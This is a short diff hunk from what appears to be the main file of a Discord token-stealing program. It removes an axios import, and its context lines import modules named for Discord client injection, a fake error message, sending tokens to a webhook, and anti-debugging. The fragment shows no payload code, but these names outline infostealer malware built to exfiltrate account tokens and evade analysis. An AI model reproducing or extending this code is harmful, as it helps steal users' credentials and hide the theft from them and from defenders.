@@ -6,7 +6,6 @@ const { discordInjected } = require("./modules/injections/discord");
 const { fakeError } = require("./modules/fakeerror/fake");
 const { webhookTokens } = require("./modules/tokens/send");
 const { antidebug } = require("./modules/antidebug/antidebug");
-let axios = require("axios");
 
 const config = require("./config/config")();
 
